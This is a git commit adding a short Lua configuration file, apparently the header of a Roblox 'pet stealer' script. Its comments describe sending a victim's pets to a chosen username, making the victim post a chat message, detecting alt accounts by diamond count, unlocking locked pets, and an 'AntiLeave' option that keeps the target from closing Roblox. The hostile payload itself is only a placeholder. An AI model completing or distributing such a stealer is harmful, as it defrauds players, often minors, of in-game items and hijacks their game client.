0cc72837605b774d9e3ca92965004b7b6a57392d
SCRIPTINGCOMMUNITY <137361755+SCRIPTINGCOMMUNITY@users.noreply.github.com>
2023-06-22 06:11:57 +0500

    Upload ZNX_script.lua

---
+++ ZNX_script.lua
@@ -0,0 +1,8 @@
+
+_G.Username = "he" --// Username To Send Pets To
+_G.GiftMessage = "he" --// Message For The Gift To Say
+_G.SendMessage = "he" --// Message the victim will send in the chat on execution
+_G.Diamonds = 1000 --// Amount Of Diamonds To detect alt set an amount of diamond that if the target is under this number, the script will show them an error
+_G.UnlockPets = true --// Unlocks Locked Pets
+_G.AntiLeave = true --// Doesn't Let The Target Close Roblox
+-- Insert your script here
